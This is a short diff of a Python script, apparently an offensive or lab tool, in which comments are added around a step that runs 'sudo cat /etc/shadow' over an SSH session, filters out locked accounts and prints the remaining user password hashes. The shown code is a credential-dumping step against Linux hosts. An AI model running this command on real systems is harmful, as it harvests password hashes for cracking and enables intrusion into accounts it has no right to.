@@ -97,8 +97,9 @@ while True:
                if (ssh != None):  # valid SSH socket?
                   try:
                       print("\nDUMPING USER PW HASHES FROM /etc/shadow:")
+                      # execute remote command to grab pw hashes
                       ssh_in, ssh_out, ssh_err = ssh.exec_command('sudo cat /etc/shadow | grep -v -e "*" -e "!"')
-                      print(ssh_out.read().decode("ASCII"))
+                      print(ssh_out.read().decode("ASCII")) # decode as ASCII and dump to stdout
                       print("^^^ END OF HASHES ^^^")
                   
                   except Exception as exc:  # it's broken
